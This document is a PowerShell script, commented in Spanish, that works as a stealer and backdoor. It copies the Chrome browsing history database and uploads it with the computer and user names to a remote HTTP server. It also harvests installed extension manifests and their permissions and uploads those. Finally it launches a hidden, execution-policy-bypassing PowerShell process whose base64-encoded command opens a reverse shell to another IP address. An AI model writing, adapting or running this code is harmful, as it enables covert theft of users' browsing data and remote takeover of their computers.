# ========================
# Recolección de historial 
# ========================
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$computerName = $env:COMPUTERNAME
$username = $env:USERNAME

$histPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempHist = "$env:TEMP\history_copy.sqlite"

if (Test-Path $histPath) {
    Copy-Item $histPath $tempHist -Force

    # Enviar archivo SQLite como binario
    $histFileName = "historial_${computerName}_${username}_$timestamp.sqlite"
    Invoke-WebRequest -Uri "http://192.168.85.15:8080/upload?file=$histFileName" -Method POST -InFile $tempHist -UseBasicParsing
}

# =============================
# Recolección de extensiones
# =============================
$extPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions"
$outExtFile = "$env:TEMP\extensiones_extraidas.txt"

"EXTENSIONES DE CHROME - Usuario: $username`n" | Out-File $outExtFile

if (Test-Path $extPath) {
    $manifests = Get-ChildItem -Path $extPath -Recurse -Filter "manifest.json" -ErrorAction SilentlyContinue

    if ($manifests.Count -eq 0) {
        "No se encontraron archivos manifest.json" | Out-File -Append $outExtFile
    }

    foreach ($manifest in $manifests) {
        try {
            $json = Get-Content $manifest.FullName -Raw | ConvertFrom-Json -ErrorAction Stop
            $name = if ($json.name) { $json.name } else { "Desconocido" }
            $desc = if ($json.description) { $json.description } else { "N/A" }
            $version = if ($json.version) { $json.version } else { "N/A" }
            $perms = if ($json.permissions) { $json.permissions -join ', ' } else { "Sin permisos" }

            $info = @"
-------------------------------
Nombre     : $name
Descripción: $desc
Versión    : $version
Permisos   : $perms
Ruta       : $($manifest.FullName)
-------------------------------
"@
            $info | Out-File -Append $outExtFile
        } catch {
            "[!] Error leyendo $($manifest.FullName): $($_.Exception.Message)`n" | Out-File -Append $outExtFile
        }
    }

    # Enviar extensiones con nombre único
    $extFileName = "extensiones_${computerName}_${username}_$timestamp.txt"
    Invoke-WebRequest -Uri "http://192.168.85.15:8080/upload?file=$extFileName" -Method POST -InFile $outExtFile -UseBasicParsing
}


$encodedPayload = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADkALgA2ADcALgAzADMAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-ExecutionPolicy Bypass", "-EncodedCommand", $encodedPayload -WindowStyle Hidden
exit
